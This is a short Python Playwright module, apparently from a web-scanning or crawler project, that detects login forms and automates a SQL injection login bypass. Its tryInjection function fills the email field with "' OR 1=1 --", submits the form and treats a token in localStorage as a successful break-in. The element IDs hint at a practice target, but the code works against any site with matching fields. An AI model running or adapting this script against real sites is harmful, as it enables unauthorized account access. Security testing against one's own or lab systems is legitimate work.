#INJECTION
from app.crawler_logic.helper_functions import *
#mehr chancen login Formular zu finden
def is_login_form(form: dict) -> bool:
    intent = (form.get("intent") or "").lower()
    if intent == "login":
        return True

    inputs = form.get("inputs", [])

    has_password = False
    has_user_field = False

    for inp in inputs:
        inp_type = (inp.get("type") or "").lower()
        name = (inp.get("name") or "").lower()
        inp_id = (inp.get("id") or "").lower()
        label = (inp.get("label") or "").lower()

        # Passwortfeld
        if inp_type == "password":
            has_password = True

        # User-Feld: email / username / login / user
        candidates = [name, inp_id, label]
        if any(x in candidates for x in ["email", "username", "user", "login"]):
            has_user_field = True

    return has_password and has_user_field


def tryInjection(page: Page) -> bool:
    dismiss_overlays(page)

    page.locator("#email").wait_for(state="visible", timeout=10_000)
    page.locator("#password").wait_for(state="visible", timeout=10_000)

    page.locator("#email").fill("' OR 1=1 --") 
    page.locator("#password").fill("a")

    click_login_button(page)

    page.wait_for_timeout(500)
    print("logged_in=", is_logged_in(page))

    return is_logged_in(page)


def is_logged_in(page: Page) -> bool:
    token = page.evaluate("() => window.localStorage.getItem('token')")
    return bool(token and len(token) > 20)

def click_login_button(page: Page) -> None:
    btn = page.locator("#loginButton")
    btn.wait_for(state="visible", timeout=10_000)

    for _ in range(3):
        dismiss_overlays(page)

        try:
            btn.click(trial=True, timeout=1500) 
            btn.click(timeout=5000)
            return
        except Exception:
            page.wait_for_timeout(250)

    raise RuntimeError("Login button click still intercepted by overlay")